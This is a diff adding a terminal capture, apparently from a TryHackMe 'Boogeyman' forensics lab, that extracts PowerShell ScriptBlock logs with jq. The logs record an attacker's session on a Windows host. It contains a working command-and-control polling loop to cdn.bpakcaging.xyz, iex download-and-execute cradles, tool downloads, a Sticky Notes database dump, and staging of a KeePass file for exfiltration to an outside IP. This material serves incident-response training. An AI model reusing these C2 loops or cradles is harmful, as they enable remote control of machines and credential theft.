@@ -1,0 +1,1885 @@
+                      
+┌──(poopi㉿kali)-[~/thm/boogeyman1]
+└─$ cat powershell.json | jq -r 'select(.ScriptBlockText != null) | "[\(.Timestamp)] \(.ScriptBlockText)\n---"'
+[2023-01-13 17:12:18.427585Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:12:18.426410Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:12:18.421820Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:12:18.416641Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:12:17.683688Z] iex(new-object net.webclient).downloadstring('https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1');pwd
+---
+[2023-01-13 17:10:55.021252Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:10:55.020163Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:10:55.018978Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:10:55.013083Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:10:53.562131Z] ps;pwd
+---
+[2023-01-13 17:10:49.440851Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:10:49.439740Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:10:49.438552Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:10:49.433996Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:10:47.549947Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:10:47.548850Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:10:47.547286Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:10:47.542668Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:10:47.119375Z] cd j.westcott;pwd
+---
+[2023-01-13 17:10:41.496793Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:10:41.495744Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:10:41.494578Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:10:41.490189Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:10:41.011975Z] cd Users;pwd
+---
+[2023-01-13 17:10:34.054322Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:10:34.053237Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:10:34.052069Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:10:34.046845Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:10:33.527334Z] ls;pwd
+---
+[2023-01-13 17:10:32.115144Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:10:32.114018Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:10:32.112821Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:10:32.106735Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:10:31.637529Z] cd C:\;pwd
+---
+[2023-01-13 17:10:24.752612Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:10:24.751197Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:10:24.749895Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:10:24.743509Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:10:24.268826Z] whoami;pwd
+---
+[2023-01-13 17:10:11.894954Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:10:11.890805Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:10:11.882448Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:10:11.877897Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:10:11.856995Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:10:11.833050Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:10:11.779258Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:10:11.772112Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:10:10.847490Z] echo `r;pwd
+---
+[2023-01-13 17:10:09.961645Z] $s='cdn.bpakcaging.xyz:8080';$i='8cce49b0-b86459bb-27fe2489';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/8cce49b0 -Headers @{"X-38d2-8f49"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/b86459bb -Headers @{"X-38d2-8f49"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/27fe2489 -Method POST -Headers @{"X-38d2-8f49"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
+
+---
+[2023-01-13 17:10:07.577594Z] iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
+---
+[2023-01-13 17:15:49.921093Z] .\sb.exe -group=all;pwd
+---
+[2023-01-13 17:15:27.811284Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:15:27.810055Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:15:27.808679Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:15:27.803213Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:15:27.092955Z] .\sb.exe;pwd
+---
+[2023-01-13 17:15:21.518351Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:15:21.517192Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:15:21.515999Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:15:21.511154Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:15:20.912833Z] .\sb.exe system;pwd
+---
+[2023-01-13 17:15:07.067625Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:15:07.066397Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:15:07.065012Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:15:07.059466Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:15:06.355560Z] .\sb.exe all;pwd
+---
+[2023-01-13 17:14:38.891059Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:14:38.890041Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:14:38.888912Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:14:38.884562Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:14:35.674126Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:14:35.672640Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:14:35.671322Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:14:35.651024Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:14:33.855233Z] iwr http://files.bpakcaging.xyz/sb.exe -outfile sb.exe;pwd
+---
+[2023-01-13 17:13:56.096252Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:13:56.095165Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:13:56.093812Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:13:56.089316Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:13:54.256260Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:13:54.255164Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:13:54.253986Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:13:54.249137Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:13:53.822455Z] cd Music;pwd
+---
+[2023-01-13 17:13:45.594169Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:13:45.593094Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:13:45.591938Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:13:45.587440Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:13:42.358736Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:13:42.357696Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:13:42.356478Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:13:42.351949Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:13:41.908545Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:13:41.906304Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:13:41.902538Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:13:41.897035Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:13:41.807193Z] cd Public;pwd
+---
+[2023-01-13 17:12:19.029603Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:12:19.028519Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:12:19.027347Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:12:19.022725Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:22:48.033748Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:22:48.029154Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:22:47.494476Z] ls AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe;pwd
+---
+[2023-01-13 17:22:46.082746Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:22:46.081658Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:22:46.080472Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:22:46.075512Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:22:45.646850Z] cd ..;pwd
+---
+[2023-01-13 17:22:33.359256Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:22:33.358162Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:22:33.357028Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:22:33.352553Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:22:32.675423Z] ls Local\Packages;pwd
+---
+[2023-01-13 17:22:24.380374Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:22:24.379220Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:22:24.377936Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:22:24.372390Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:22:23.871653Z] ls Local;pwd
+---
+[2023-01-13 17:21:53.531782Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:21:53.520747Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:21:53.519459Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:21:53.514882Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:21:51.688737Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:21:51.687514Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:21:51.686226Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:21:51.680852Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:21:51.236206Z] cd ..\AppData;pwd
+---
+[2023-01-13 17:20:05.522330Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:20:05.521207Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:20:05.519984Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:20:05.514600Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:19:06.577378Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:19:06.576375Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:19:06.575030Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:19:06.569120Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:19:06.035992Z] ls C:\Users\j.westcott\Documents\protected_data.kdbx;pwd
+---
+[2023-01-13 17:18:15.267675Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:18:15.266276Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:18:15.265108Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:18:15.260559Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:18:13.946269Z] .\sb.exe -group=user;pwd
+---
+[2023-01-13 17:18:08.449239Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:18:08.448037Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:18:08.446689Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:18:08.441918Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:18:07.999315Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:18:07.998237Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:18:07.992167Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:18:07.987707Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:18:05.437844Z] Seatbelt.exe -group=user;pwd
+---
+[2023-01-13 17:17:46.206990Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:17:46.205797Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:17:46.203302Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:17:46.197517Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:31:56.681888Z] split-path $pwd'\0x00';pwd
+---
+[2023-01-13 17:31:55.274743Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:31:55.273631Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:31:55.272437Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:31:55.267656Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:31:49.351889Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:31:49.350784Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:31:49.349606Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:31:49.343738Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:31:48.901931Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:31:48.900636Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:31:48.892432Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:31:48.883733Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:31:48.507719Z] $file='protected_data.kdbx'; $destination = "167.71.211.113"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd
+---
+[2023-01-13 17:26:10.843133Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:26:10.842051Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:26:10.840885Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:26:10.836692Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:26:08.777044Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:26:08.775821Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:26:08.774632Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:26:08.769738Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:26:08.330301Z] cd Documents;pwd
+---
+[2023-01-13 17:25:39.363779Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:25:39.362414Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:25:39.360611Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:25:39.353558Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:25:38.759011Z] .\Music\sq3.exe AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite "SELECT * from NOTE limit 100";pwd
+---
+[2023-01-13 17:24:13.544434Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:24:13.543361Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:24:13.542167Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:24:13.537329Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:24:13.082157Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:24:13.080982Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:24:13.067468Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:24:13.059624Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:24:12.967200Z] .\sq3.exe AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\;pwd
+---
+[2023-01-13 17:23:53.762593Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:23:53.761511Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:23:53.760368Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:23:53.755824Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:23:40.938951Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:23:40.937471Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:23:40.936179Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:23:40.931208Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:23:38.796891Z] iwr http://files.bpakcaging.xyz/sq3.exe -outfile sq3.exe;pwd
+---
+[2023-01-13 17:23:07.221065Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:23:07.219687Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:23:07.218280Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:23:07.212511Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:22:54.026355Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:22:54.025264Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:22:54.024081Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:22:54.019225Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:22:53.558146Z] ls AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState;pwd
+---
+[2023-01-13 17:22:48.036021Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:22:48.034920Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:53.747633Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:52.897705Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:52.896644Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:52.895486Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:52.889472Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:52.516998Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:52.515974Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:52.514856Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:52.510477Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:51.660118Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:51.659061Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:51.656140Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:51.651663Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:51.311112Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:51.310030Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:51.308821Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:51.304023Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:50.409082Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:50.407868Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:50.406204Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:50.401734Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:50.086625Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:50.085548Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:50.084402Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:50.079771Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:49.208259Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:49.207178Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:49.206004Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:49.200567Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:48.862086Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:48.860564Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:48.859410Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:48.853915Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:47.965294Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:47.964229Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:47.963064Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:47.958431Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:47.602114Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:47.600985Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:47.599764Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:47.594382Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:46.700240Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:46.699082Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:46.697678Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:46.692764Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:46.366131Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:46.364981Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:46.363839Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:46.359264Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:45.456156Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:45.454980Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:45.453575Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:45.448657Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:45.123021Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:45.121962Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:45.120801Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:45.116255Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:44.225457Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:44.224447Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:44.223209Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:44.215739Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:43.902124Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:43.901043Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:43.899901Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:43.894381Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
